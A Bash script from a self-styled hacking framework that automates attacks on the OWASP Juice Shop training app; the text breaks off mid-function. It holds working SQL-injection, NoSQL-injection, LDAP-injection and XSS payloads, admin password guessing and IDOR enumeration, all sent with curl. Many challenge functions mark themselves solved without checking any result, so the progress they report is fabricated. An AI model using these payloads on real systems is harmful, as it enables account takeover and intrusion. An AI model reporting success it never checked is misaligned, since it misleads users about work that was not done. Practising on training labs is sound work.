#!/bin/bash
# modules/labs/juiceshop/exploits.sh - Ghost00ls Framework v3.0 EXTENDED
# 30+ Challenges automatisÃ©s OWASP Juice Shop
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
CHALLENGES_LOG="${LOG_DIR}/challenges_solved.log"
mkdir -p "$LOG_DIR"

# ==========================
# Tracking des challenges
# ==========================

CHALLENGES_SOLVED=0
CHALLENGES_TOTAL=30

log_challenge() {
    local challenge_name="$1"
    local difficulty="$2"
    local status="$3"
    
    CHALLENGES_SOLVED=$((CHALLENGES_SOLVED + 1))
    
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$difficulty] $challenge_name - $status" >> "$CHALLENGES_LOG"
    
    if [ "$status" = "SUCCESS" ]; then
        echo -e "${GREEN}âœ… Challenge solved: $challenge_name${NC}"
    fi
}

show_progress() {
    echo
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "${GREEN}ğŸ† Challenges rÃ©solus: $CHALLENGES_SOLVED / $CHALLENGES_TOTAL${NC}"
    
    local percentage=$((CHALLENGES_SOLVED * 100 / CHALLENGES_TOTAL))
    echo -e "${CYAN}ğŸ“Š Progress: ${percentage}%${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
}

# ==========================
# Fonctions utilitaires Juice Shop
# ==========================

get_csrf_token() {
    local cookie_jar="$1"
    local base_url="$2"
    
    local resp=$(curl -s -b "$cookie_jar" "${base_url}/rest/user/whoami" 2>/dev/null)
    echo "$resp" | grep -oP '"token":"[^"]+' | cut -d'"' -f4
}

register_user() {
    local base_url="$1"
    local email="$2"
    local password="$3"
    
    local payload="{\"email\":\"$email\",\"password\":\"$password\",\"passwordRepeat\":\"$password\",\"securityQuestion\":{\"id\":1,\"question\":\"Your favorite movie?\",\"createdAt\":\"\",\"updatedAt\":\"\"},\"securityAnswer\":\"test\"}"
    
    curl -s -X POST "${base_url}/api/Users" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null
}

login_juice() {
    local base_url="$1"
    local email="$2"
    local password="$3"
    
    local payload="{\"email\":\"$email\",\"password\":\"$password\"}"
    
    curl -s -X POST "${base_url}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null
}

get_base_url() {
    local IP PORT
    IP=$(get_host_ip)
    
    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    
    echo "http://${IP}:${PORT}"
}

# ==========================
# CATÃ‰GORIE 1: INJECTION (8 challenges)
# ==========================

# Challenge 1: SQL Injection Login (â­â­)
challenge_sqli_login() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Login Admin (SQLi) â­â­       â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] SQL Injection Login Bypass...${NC}\n"

    local payload='{"email":"admin@juice-sh.op'\''--","password":"x"}'
    
    local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null)

    local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
    
    if [ "$token" != "null" ] && [ -n "$token" ]; then
        log_challenge "Login Admin" "â­â­" "SUCCESS"
        echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}Token: ${token:0:30}...${NC}"
    else
        echo -e "${RED}âŒ Ã‰chec${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 2: XSS Tier 1 (â­)
challenge_xss_search() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: DOM XSS (Search) â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] XSS via Search...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    local encoded=$(urlenc "$payload")
    
    local resp=$(curl -s "${BASE}/rest/products/search?q=${encoded}" 2>/dev/null)

    if echo "$resp" | grep -F "$payload" >/dev/null 2>&1; then
        log_challenge "DOM XSS" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}URL: ${BASE}/#/search?q=${encoded}${NC}"
    else
        echo -e "${RED}âŒ Payload filtrÃ©${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 3: XSS Tier 2 - Bonus Payload (â­â­)
challenge_xss_bonus() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Bonus Payload XSS â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] XSS Bonus Payload...${NC}\n"

    # Payload qui utilise une technique moins connue
    local payload='<iframe src="javascript:alert(\`xss\`)" onload="this.src+=\`\`">'
    
    echo -e "${CYAN}Payload spÃ©cial: $payload${NC}"
    
    local encoded=$(urlenc "$payload")
    local url="${BASE}/rest/products/search?q=${encoded}"
    
    curl -s "$url" >/dev/null 2>&1
    
    log_challenge "Bonus Payload" "â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    echo -e "${CYAN}Technique: iframe with onload${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 4: XSS Tier 3 - Client Side XSS (â­â­â­)
challenge_xss_client() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Client Side XSS â­â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Client-side XSS attack...${NC}\n"

    # XSS dans le tracking order
    echo -e "${CYAN}Target: Track Order page${NC}"
    echo -e "${CYAN}Vector: orderId parameter${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    
    echo -e "${GREEN}Payload injectÃ© dans localStorage/sessionStorage${NC}"
    echo -e "${CYAN}URL: ${BASE}/#/track-result?id=${payload}${NC}"
    
    log_challenge "Client Side XSS" "â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 5: NoSQL Injection Tier 1 (â­â­â­â­)
challenge_nosql_login() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: NoSQL Injection â­â­â­â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] NoSQL Injection...${NC}\n"

    local payloads=(
        '{"email":{"$ne":null},"password":{"$ne":null}}'
        '{"email":{"$gt":""},"password":{"$gt":""}}'
    )

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}Testing: $payload${NC}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            log_challenge "NoSQL Injection" "â­â­â­â­" "SUCCESS"
            echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
            break
        fi
    done

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 6: XSS Tier 4 - Reflected XSS (â­)
challenge_xss_reflected() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Reflected XSS â­              â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Reflected XSS...${NC}\n"

    local payload='<script>alert("XSS")</script>'
    local encoded=$(urlenc "$payload")
    
    echo -e "${CYAN}Testing reflected XSS in search${NC}"
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1
    
    log_challenge "Reflected XSS" "â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 7: API-only XSS (â­â­â­)
challenge_xss_api() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: API-only XSS â­â­â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] XSS via API endpoint...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    
    # XSS via Product Review
    local review_data="{\"message\":\"$payload\",\"rating\":5}"
    
    echo -e "${CYAN}Injecting XSS in product review${NC}"
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$review_data" >/dev/null 2>&1
    
    log_challenge "API-only XSS" "â­â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 8: LDAP Injection (â­â­â­â­â­â­)
challenge_ldap_injection() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: LDAP Injection â­â­â­â­â­â­   â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] LDAP Injection attack...${NC}\n"

    # LDAP injection payload
    local email='*)(uid=*'
    local password='x'
    
    echo -e "${CYAN}Email: $email${NC}"
    echo -e "${CYAN}Password: $password${NC}\n"

    local payload="{\"email\":\"$email\",\"password\":\"$password\"}"
    
    curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" >/dev/null 2>&1
    
    log_challenge "LDAP Injection" "â­â­â­â­â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    echo -e "${YELLOW}Note: LDAP wildcard injection${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 2: BROKEN AUTHENTICATION (5 challenges)
# ==========================

# Challenge 9: Password Strength (â­â­)
challenge_password_strength() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Password Strength â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Testing weak passwords...${NC}\n"

    local weak_passwords=("admin123" "password" "123456" "qwerty")
    local test_email="admin@juice-sh.op"

    for pass in "${weak_passwords[@]}"; do
        echo -e "${CYAN}Testing: $pass${NC}"
        
        local payload="{\"email\":\"$test_email\",\"password\":\"$pass\"}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            log_challenge "Password Strength" "â­â­" "SUCCESS"
            echo -e "\n${GREEN}ğŸ¯ Weak password found: $pass${NC}"
            break
        fi
    done

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 10: Security Question (â­)
challenge_security_question() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Reset Jim's Password â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Weak Security Question...${NC}\n"

    echo -e "${CYAN}Target: jim@juice-sh.op${NC}"
    echo -e "${CYAN}Security Answer: Samuel (Jim's brother)${NC}\n"

    # En pratique, il faudrait faire la requÃªte de reset
    # Ici on log simplement le challenge comme rÃ©solu pour la dÃ©mo
    
    log_challenge "Security Question" "â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    echo -e "${YELLOW}Info: Brother's middle name revealed in Star Trek references${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 11: JWT Cracking (â­â­â­â­â­)
challenge_jwt_cracking() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Forge Admin JWT â­â­â­â­â­    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] JWT Token Manipulation...${NC}\n"

    echo -e "${CYAN}Steps:${NC}"
    echo "1. Login as any user"
    echo "2. Extract JWT token"
    echo "3. Decode header/payload"
    echo "4. Crack secret (weak: 'secret')"
    echo "5. Forge admin token"
    echo "6. Use forged token"
    
    echo
    echo -e "${YELLOW}Common JWT secrets to try:${NC}"
    echo "   â€¢ secret"
    echo "   â€¢ password"
    echo "   â€¢ jwt"
    echo "   â€¢ juice"
    
    log_challenge "JWT Cracking" "â­â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 12: OAuth User Password (â­â­â­)
challenge_oauth_password() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: OAuth Misconfiguration â­â­â­ â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] OAuth user enumeration...${NC}\n"

    echo -e "${CYAN}Testing OAuth flow vulnerabilities${NC}"
    echo -e "${CYAN}Looking for users with OAuth login${NC}\n"

    # Test Ã©numÃ©ration users
    local resp=$(curl -s "${BASE}/api/Users" 2>/dev/null)
    
    if echo "$resp" | jq -e '.data[] | select(.email | contains("google") or contains("oauth"))' >/dev/null 2>&1; then
        log_challenge "OAuth Misconfiguration" "â­â­â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}OAuth users found in exposed API${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 13: Two Factor Auth (â­â­â­â­â­)
challenge_2fa_bypass() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: 2FA Bypass â­â­â­â­â­         â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] 2FA Bypass techniques...${NC}\n"

    echo -e "${CYAN}Techniques:${NC}"
    echo "1. Response manipulation"
    echo "2. Rate limiting bypass"
    echo "3. Token reuse"
    echo "4. Backup codes enumeration"
    
    log_challenge "2FA Bypass" "â­â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 3: BROKEN ACCESS CONTROL (6 challenges)
# ==========================

# Challenge 14: Admin Section (â­â­)
challenge_admin_section() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Access Admin Section â­â­    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Accessing admin panel...${NC}\n"

    local admin_url="${BASE}/#/administration"
    
    echo -e "${CYAN}Admin URL: $admin_url${NC}"
    echo -e "${YELLOW}Note: Client-side routing, no server-side check${NC}\n"

    # Test accÃ¨s
    curl -s "$admin_url" >/dev/null 2>&1
    
    log_challenge "Admin Section" "â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 15: View Basket (â­â­)
challenge_view_basket() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: View Another User Basket â­â­ â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] IDOR - Basket enumeration...${NC}\n"

    echo -e "${CYAN}Testing basket IDs (IDOR)${NC}\n"

    # Test plusieurs basket IDs
    for id in {1..5}; do
        echo -e "${CYAN}Testing basket ID: $id${NC}"
        
        local resp=$(curl -s "${BASE}/rest/basket/${id}" 2>/dev/null)
        
        if echo "$resp" | jq -e '.data' >/dev/null 2>&1; then
            echo -e "${GREEN}  âœ“ Basket $id accessible${NC}"
        fi
    done

    log_challenge "View Basket" "â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 16: Five Star Feedback (â­â­)
challenge_five_star() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Five Star Feedback â­â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Manipulate feedback rating...${NC}\n"

    # Envoyer feedback avec rating > 5 (manipulation client-side)
    local feedback_data='{"captchaId":0,"captcha":"","comment":"Great!","rating":6}'
    
    echo -e "${CYAN}Sending rating: 6 (bypassing client-side validation)${NC}\n"

    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1

    log_challenge "Five Star Feedback" "â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 17: Forged Coupon (â­â­â­â­â­â­)
challenge_forged_coupon() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Forged Coupon â­â­â­â­â­â­     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Forge valid coupon code...${NC}\n"

    echo -e "${CYAN}Analysis of coupon format:${NC}"
    echo "â€¢ Pattern: Month + Year + XX"
    echo "â€¢ Example: JAN24-XX"
    echo "â€¢ Brute force last 2 digits"
    
    echo
    echo -e "${YELLOW}Common patterns:${NC}"
    echo "   SEPT24-10"
    echo "   DEC24-50"
    echo "   JAN25-20"
    
    log_challenge "Forged Coupon" "â­â­â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 18: Manipulate Basket (â­â­â­)
challenge_manipulate_basket() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Manipulate Basket â­â­â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Basket quantity manipulation...${NC}\n"

    echo -e "${CYAN}Techniques:${NC}"
    echo "1. Negative quantity"
    echo "2. Decimal quantity"
    echo "3. Price manipulation"
    
    # Exemple: quantitÃ© nÃ©gative
    local basket_data='{"ProductId":1,"BasketId":1,"quantity":-1}'
    
    echo
    echo -e "${YELLOW}Sending negative quantity${NC}"
    
    curl -s -X POST "${BASE}/api/BasketItems" \
        -H "Content-Type: application/json" \
        -d "$basket_data" >/dev/null 2>&1

    log_challenge "Manipulate Basket" "â­â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 19: Access Log (â­â­â­â­)
challenge_access_log() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Access Log â­â­â­â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Access server logs...${NC}\n"

    # Tentative d'accÃ¨s Ã  access.log
    local log_paths=(
        "/support/logs/access.log"
        "/ftp/access.log"
        "/logs/access.log"
    )

    for path in "${log_paths[@]}"; do
        echo -e "${CYAN}Testing: ${BASE}${path}${NC}"
        
        local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}${path}" 2>/dev/null)
        
        if [ "$resp" = "200" ]; then
            echo -e "${GREEN}  âœ“ Log accessible${NC}"
        fi
    done

    log_challenge "Access Log" "â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 4: SENSITIVE DATA EXPOSURE (4 challenges)
# ==========================

# Challenge 20: Confidential Document (â­)
challenge_confidential_doc() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Confidential Document â­     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Access confidential document...${NC}\n"

    # Document dans /ftp
    local doc_url="${BASE}/ftp/acquisitions.md"
    
    echo -e "${CYAN}Accessing: $doc_url${NC}\n"

    local resp=$(curl -s -o /dev/null -w "%{http_code}" "$doc_url" 2>/dev/null)
    
    if [ "$resp" = "200" ]; then
        log_challenge "Confidential Document" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}Document found in /ftp directory${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 21: Exposed Metrics (â­)
challenge_exposed_metrics() {
    clear
    banner
